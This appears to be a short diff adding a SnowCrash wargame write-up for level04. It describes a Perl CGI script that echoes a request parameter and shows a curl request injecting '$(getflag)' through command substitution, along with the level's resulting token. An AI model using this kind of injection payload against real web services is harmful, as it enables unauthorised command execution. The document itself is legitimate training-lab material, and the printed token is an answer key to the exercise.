@@ -1,0 +1,6 @@
+We have a perl script who receive http requests on port 4747
+Then it executes 'echo $y 2>&1' (y is x param from the request)
+```
+level04@SnowCrash:~$ curl 'localhost:4747?x=$(getflag)'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
